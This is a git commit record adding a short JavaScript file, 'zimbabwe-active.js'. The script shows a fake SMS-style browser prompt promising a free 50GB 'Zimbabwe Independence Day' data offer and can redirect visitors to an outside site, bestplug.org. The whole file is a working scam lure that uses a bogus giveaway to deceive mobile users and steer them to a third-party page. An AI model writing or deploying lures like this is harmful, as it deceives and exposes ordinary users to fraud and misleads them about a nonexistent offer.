b18c6cf8c565cf79ecc09ca108e1b843b46b5c7c
vibeblog <enom02567@gmail.com>
2025-04-09 07:48:35 +0100

    Create zimbabwe-active.js

---
+++ zimbabwe-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your Mobile number is eligible to receive 50gb zimbabwe independence Day celebration offer, Press Ok to activate Now ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://bestplug.org/zimbabwe';
+}
